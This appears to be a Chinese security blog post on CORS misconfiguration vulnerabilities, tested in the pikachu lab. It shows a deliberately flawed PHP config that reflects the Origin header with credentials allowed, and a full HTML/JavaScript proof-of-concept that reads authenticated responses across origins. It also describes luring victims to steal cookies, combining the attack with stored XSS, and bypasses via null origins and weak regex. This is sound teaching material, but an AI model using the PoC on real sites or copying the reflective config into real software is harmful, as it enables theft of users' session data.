@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CORS漏洞 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近了解到了CORS漏洞，赶紧来学一下。 CORS概念同源策略在讲CORS之前，要先知道同源策略这个机制，这个机制是浏览器的安全核心，它规定，如果两个页面的协议、端口和域名不完全相同，那么它们就是不同源的。浏览器会限制不同源的文档或脚本相互读取数据（例如，防止站点 A 的脚本读取站点 B 的 Cookie 或页面内容）。 CORS而在实际的web开发中，经常需要跨域请求数据，例如：前端在www">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CORS漏洞">
+<meta property="og:url" content="https://lxu2n.github.io/posts/873dd98/index.html">
+<meta property="og:site_name" content="红烧花园宝宝">
+<meta property="og:description" content="前言最近了解到了CORS漏洞，赶紧来学一下。 CORS概念同源策略在讲CORS之前，要先知道同源策略这个机制，这个机制是浏览器的安全核心，它规定，如果两个页面的协议、端口和域名不完全相同，那么它们就是不同源的。浏览器会限制不同源的文档或脚本相互读取数据（例如，防止站点 A 的脚本读取站点 B 的 Cookie 或页面内容）。 CORS而在实际的web开发中，经常需要跨域请求数据，例如：前端在www">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
+<meta property="article:published_time" content="2026-02-24T05:55:04.000Z">
+<meta property="article:modified_time" content="2026-02-24T05:57:15.719Z">
+<meta property="article:author" content="红烧花园宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CORS漏洞",
+  "url": "https://lxu2n.github.io/posts/873dd98/",
+  "image": "https://lxu2n.github.io/image/1.png",
+  "datePublished": "2026-02-24T05:55:04.000Z",
+  "dateModified": "2026-02-24T05:57:15.719Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "红烧花园宝宝",
+      "url": "https://lxu2n.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/873dd98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CORS漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://lxu2n.top/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">CORS漏洞</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CORS漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-24T05:55:04.000Z" title="发表于 2026-02-24 13:55:04">2026-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-24T05:57:15.719Z" title="更新于 2026-02-24 13:57:15">2026-02-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近了解到了CORS漏洞，赶紧来学一下。</p>
+<h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>在讲CORS之前，要先知道同源策略这个机制，这个机制是浏览器的安全核心，它规定，如果两个页面的协议、端口和域名不完全相同，那么它们就是不同源的。浏览器会限制不同源的文档或脚本相互读取数据（例如，防止站点 A 的脚本读取站点 B 的 Cookie 或页面内容）。</p>
+<h3 id="CORS-1"><a href="#CORS-1" class="headerlink" title="CORS"></a>CORS</h3><p>而在实际的web开发中，经常需要跨域请求数据，例如：前端在<a target="_blank" rel="noopener" href="http://www.a.com,api接口在api.b.com这样前端去向api进行一个请求,就是跨域的请求.cors就是用来打破同源策略的,它通过在服务端的/">www.a.com，api接口在api.b.com这样前端去向api进行一个请求，就是跨域的请求。CORS就是用来打破同源策略的，它通过在服务端的</a> HTTP 响应头中添加特定的字段，告诉浏览器：“我允许这个外域的页面来读取我的数据”。</p>
+<h4 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h4><p>CORS 漏洞并不是 CORS 机制本身的设计缺陷，而是服务端开发人员在配置 CORS 策略时出现了错误，导致权限放得过宽。<br>当服务端没有严格校验请求的来源（<code>Origin</code>），并且允许跨域携带凭证（如 Cookie）时，攻击者就可以通过构造恶意网页，欺骗受害者访问，从而在受害者不知情的情况下，以受害者的身份向存在漏洞的网站发起请求并窃取敏感数据。</p>
+<h2 id="漏洞的核心"><a href="#漏洞的核心" class="headerlink" title="漏洞的核心"></a>漏洞的核心</h2><p>是和两个关键的HTTP响应头有关</p>
+<ol>
+<li><code>Access-Control-Allow-Origin</code>:指定哪些域可以访问该资源。</li>
+<li><code>Access-Control-Allow-Credentials</code>:指定是否允许浏览器发送Cookie、HTTP认证信息等凭证。如果设置为true，则允许。<br>当然还有一个注意点：<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></tbody></table></figure>
+如果是任意域都能访问的，而且为true的，是不能带Cookie出来的。</li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在pikachu的abc.php文件中配置有缺陷的CORS策略<br><img src="/posts/873dd98/20260224124007445.png" alt="image.png"></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_ORIGIN'</span>])) {  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">"Access-Control-Allow-Origin: <span class="subst">{$_SERVER['HTTP_ORIGIN']}</span>"</span>);  </span><br><span class="line"><span class="comment">//header("Access-Control-Allow-Origin: www.test.com");  </span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">'Access-Control-Allow-Credentials: true'</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">'Access-Control-Max-Age: 86400'</span>); <span class="comment">// cache for 1 day  </span></span><br><span class="line">  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>我们来抓个包测试一下。<br><img src="/posts/873dd98/20260224124452239.png" alt="image.png"><br>这就显示存在漏洞。<br>那么现在来模拟一下，就比如这个站点是有CORS漏洞的，A是攻击方，B是受害方，B是这个站点的管理员，并且他已经登录了这个站点.A开了一个新的网站并做了如下配置：</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS 漏洞测试 PoC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> { <span class="attribute">font-family</span>: Arial, sans-serif; <span class="attribute">padding</span>: <span class="number">20px</span>; }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#result</span> { <span class="attribute">background-color</span>: <span class="number">#f4f4f4</span>; <span class="attribute">padding</span>: <span class="number">10px</span>; <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>; <span class="attribute">margin-top</span>: <span class="number">10px</span>; <span class="attribute">white-space</span>: pre-wrap; <span class="attribute">word-wrap</span>: break-word; }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS 漏洞利用测试<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>此页面尝试跨域获取目标网站的敏感数据。如果目标网站存在 CORS 配置不当（允许 Origin 反射且允许携带凭证），数据将被窃取并显示在下方。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">strong</span>&gt;</span>目标 API 接口:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"targetUrl"</span> <span class="attr">value</span>=<span class="string">"http://localhost/pikachu/vul/infoleak/abc.php"</span> <span class="attr">style</span>=<span class="string">"width: 300px;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"triggerCORS()"</span>&gt;</span>执行攻击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>窃取到的数据：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span>等待执行...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">triggerCORS</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> target = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'targetUrl'</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> resultDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'result'</span>);</span></span><br><span class="line"><span class="language-javascript">            resultDiv.<span class="property">innerText</span> = <span class="string">"正在请求中..."</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 使用 Fetch API 发起跨域请求</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(target, {</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">'GET'</span>, <span class="comment">// 根据目标接口类型，也可以改为 POST</span></span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 【核心关键点】</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 告诉浏览器在发送请求时，必须带上目标网站的 Cookie等认证信息</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">credentials</span>: <span class="string">'include'</span> </span></span><br><span class="line"><span class="language-javascript">            })</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (response.<span class="property">ok</span>) {</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">                } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`请求失败。HTTP 状态码: <span class="subst">${response.status}</span>。可能是没有漏洞，或者接口不存在。`</span>);</span></span><br><span class="line"><span class="language-javascript">                }</span></span><br><span class="line"><span class="language-javascript">            })</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 如果成功获取到数据，说明漏洞存在！</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 在真实的攻击中，这里的代码会将 data 发送到攻击者自己的服务器上</span></span></span><br><span class="line"><span class="language-javascript">                resultDiv.<span class="property">innerText</span> = data;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"成功获取到数据："</span>, data);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">"CORS 漏洞利用成功！"</span>);</span></span><br><span class="line"><span class="language-javascript">            })</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">                resultDiv.<span class="property">innerText</span> = <span class="string">"跨域请求被浏览器拦截或请求失败。\n\n详情查阅浏览器控制台(F12)。\n错误信息: "</span> + error.<span class="property">message</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"CORS 失败:"</span>, error);</span></span><br><span class="line"><span class="language-javascript">            });</span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>这是ai写的获取到响应并发送到vps上（也可以更改配置，获取cookie），假设可以获取cookie<br>这个网站域名是<a target="_blank" rel="noopener" href="http://www.aaa.com/111.html,A%E5%B0%86%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%91%E9%80%81%E7%BB%99B%EF%BC%8C%E5%B9%B6%E8%AF%B1%E4%BD%BFB%E7%82%B9%E5%87%BB%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%88%B0B%E7%9A%84cookie%EF%BC%8C%E5%8F%91%E9%80%81%E5%88%B0%E6%88%91%E4%BB%AC%E7%9A%84vps%E4%B8%8A%E3%80%82">www.aaa.com/111.html,A将这个网站发送给B，并诱使B点击这个网站，获取到B的cookie，发送到我们的vps上。</a><br><img src="/posts/873dd98/20260224125721372.png" alt="image.png"><br>至此攻击完成</p>
+<h1 id="CORS的进阶"><a href="#CORS的进阶" class="headerlink" title="CORS的进阶"></a>CORS的进阶</h1><h2 id="CORS结合XSS"><a href="#CORS结合XSS" class="headerlink" title="CORS结合XSS"></a>CORS结合XSS</h2><p>结合xss的利用，应该是存储型的xss。原理也很简单就是将<a target="_blank" rel="noopener" href="http://www.aaa.com/111.html%E5%AD%98%E5%82%A8%E5%88%B0%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AB%99%E7%82%B9%E9%87%8C%EF%BC%8C%E8%AF%B1%E6%83%91B%E5%8E%BB%E7%82%B9%E5%87%BB%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%88%B0Cookie%EF%BC%8C%E6%88%96%E8%80%85%E7%9B%B4%E6%8E%A5%E9%85%8D%E7%BD%AE%E6%81%B6%E6%84%8F%E7%9A%84javascript%E4%BB%A3%E7%A0%81%E5%AD%98%E5%9C%A8xss%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AF%B1%E6%83%91b%E5%8E%BB%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96Cookie">www.aaa.com/111.html存储到存在xss漏洞的站点里，诱惑B去点击，获取到Cookie，或者直接配置恶意的javascript代码存在xss服务器中，然后诱惑b去点击获取Cookie</a></p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://localhost/111.html"</span>&gt;<span class="number">11111</span>&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/posts/873dd98/20260224134742780.png" alt="image.png"><br>当点击111时，可以直接跳转到111.html<br><img src="/posts/873dd98/20260224134819072.png" alt="image.png"><br>获取到敏感信息，xss主要方便钓鱼用。</p>
+<h2 id="关于CORS的绕过"><a href="#关于CORS的绕过" class="headerlink" title="关于CORS的绕过"></a>关于CORS的绕过</h2><ol>
+<li>如果开发者配置了一些waf，但是信任null的话（也就是配置<code>Access-Control-Allow-Origin: null</code>），攻击者可以在恶意网页中嵌入一个带有 <code>sandbox</code> 属性的 iframe，从这个 iframe 中发起的跨域请求，其 Origin 就是 <code>null</code>。如果服务端信任 <code>null</code> 并允许凭证，数据就会被窃取。</li>
+<li>如果是配置了不严谨的正则匹配/域名校验，就是打算允许 <code>target.com</code>，但用了弱匹配，导致攻击者注册 <code>target.com.evil.com</code> 或 <code>not-target.com</code> 也能绕过。还有在正则中 <code>.</code> 代表任意字符。如果想匹配 <code>api.target.com</code>，但写成了 <code>api.target.com</code>（没有转义 <code>.</code>），那么攻击者注册 <code>apidtarget.com</code> 也能通过校验。</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/byErichas/p/15918919.html">CORS跨域访问漏洞 - Erichas - 博客园</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/358289.html">CORS结合XSS利用 - FreeBuf网络安全行业门户</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/873dd98/">https://lxu2n.github.io/posts/873dd98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/f0486b72/" title="java内存马_6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java内存马_6</div></div><div class="info-2"><div class="info-item-1">前言Valve内存马是和filter，listener，sevlet内存马是不同的，后三者的内存马是放在web的请求中的，而Valve的内存马是放在Pipeline的流程中的。 什么是Valve因为前面可能只是提了一下valve，比如StandardEngineValve，并没有具体的介绍，所以这里具体介绍一下：Tomcat 的容器结构是层级制的（Engine -&gt; Host -&gt; Context -&gt; Wrapper）。每个容器都有一个 Pipeline（管道），而管道中可以挂载多个 Valve（阀门）。例子：当一个请求通过容器时，它会像流水一样流经管道中的每一个阀门。每个阀门负责完成特定的任务，然后将请求传递给下一个阀门，直到最后由 BasicValve（基础阀门）将请求交给子容器或业务逻辑。简单来说，Valve 是 Tomcat 管道（Pipeline） 机制中的一个组件，用于在请求到达最终的 Servlet 之前，对请求进行拦截、处理或过滤。大家可以看这张图辅助理解：其实Valve是和filter很类似的，我们也可以通过特定的方法将我们创造的valve放...</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div 